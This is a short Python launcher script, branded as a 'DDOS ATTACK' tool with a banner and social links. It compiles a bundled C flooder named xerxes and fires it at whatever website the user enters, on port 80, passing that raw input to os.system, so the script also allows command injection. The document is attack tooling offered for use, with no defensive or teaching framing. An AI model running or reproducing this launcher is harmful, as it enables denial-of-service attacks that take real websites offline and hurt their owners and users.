import os
os.system("clear")
print("""
  _____  _____   ____   _____         _______ _______       _____ _  __ 
 |  __ \|  __ \ / __ \ / ____|     /\|__   __|__   __|/\   / ____| |/ / 
 | |  | | |  | | |  | | (___      /  \  | |     | |  /  \ | |    | ' /  
 | |  | | |  | | |  | |\___ \    / /\ \ | |     | | / /\ \| |    |  <   
 | |__| | |__| | |__| |____) |  / ____ \| |     | |/ ____ \ |____| . \  
 |_____/|_____/ \____/|_____/  /_/    \_\_|     |_/_/    \_\_____|_|\_\ 
 
 DDOS ATTACK BY QN4K GAMING & MR R
 GitHub: https://github.com/QN4K
 YouTube: https://youtube.com/@qn4kgaming
 Telegram: https://t.me/qn4kgamingyt
""")  
os.system("chmod +x xerxes.c")
os.system("gcc xerxes.c -o xerxes")
a = input("\n Enter website address eg : www.********.com \n Website Name : ")
os.system("./xerxes "+a+" 80")
